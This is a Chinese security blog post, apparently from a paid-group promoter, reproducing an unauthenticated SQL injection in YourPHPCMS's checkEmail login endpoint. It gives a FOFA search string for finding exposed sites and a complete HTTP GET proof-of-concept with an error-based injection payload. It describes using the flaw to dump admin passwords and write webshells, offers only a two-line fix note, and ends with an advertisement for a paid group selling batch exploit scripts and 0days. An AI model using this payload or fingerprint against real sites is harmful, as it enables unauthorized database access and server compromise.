#  「漏洞复现」YourPHPCMS checkEmail SQL注入漏洞   
冷漠安全  冷漠安全   2024-12-14 04:57  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
Yourphp企业网站管理系统是一款完全开源免费的PHP+MYSQL系统。核心采用了ThinkPHP框架,同时也作为开源软件发布。 集众多开源项目于一身的特点,使本系统从安全,效率,易用及可扩展性上更加突出。程序内置SEO优化机制，使企业网站更容易被推广。强大灵活的后台管理功能、任何添加多国语言功能、静态页面生成功能、自定义模型功能、自制插件安装管理功能、自定义幻灯片模板等可为企业打造出大气漂亮且具有营销力的精品网站。  
  
0x03  
  
漏洞威胁  
  
YourPHPCMS /index.php?g=Admin&m=Login&a=checkEmail 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
header="YP_onlineid"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ocDZzs3LkAmUwCpbMRb1icEwavyDkFbFYfeibXvB1D3FprPfwqcF4JIxl1sckfyOZcdBttR2tKfAqw/640?wx_fmt=png&from=appmsg "")  
  
0x05  
  
漏洞复现  
  
PoC  
```
GET /index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=%27+AND+%28SELECT+2578+FROM%28SELECT+COUNT%28%2A%29%2CCONCAT%280x71706b6b71%2C%28SELECT+%28ELT%282578%3D2578%2C1%29%29%29%2C0x7162627671%2CFLOOR%28RAND%280%29%2A2%29%29x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x%29a%29--+xmVt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ocDZzs3LkAmUwCpbMRb1icEzKN4EEupTCOnKsHfvAxxvibs8PiaFWVOI3tFqAhyRlpd6yyqtJEsjoZA/640?wx_fmt=png&from=appmsg "")  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ocDZzs3LkAmUwCpbMRb1icEibhibvXaRWL8vlh4y2oWjmtsUBDecu1UM4iafVGtjYLw33jcZEA01LK0g/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ocDZzs3LkAmUwCpbMRb1icExBHjV5d6xcpXkpXpPvbDTn9krh7jUbGPAJx5pdgnH9w5zVkU9D7EZQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0ocDZzs3LkAmUwCpbMRb1icEVCHshh3GUn88nRqNdLcU1fyH2Vb9zIm8Vw4qPGFZGmNmtibPcjqVABw/640?wx_fmt=gif&from=appmsg "")  
  
  
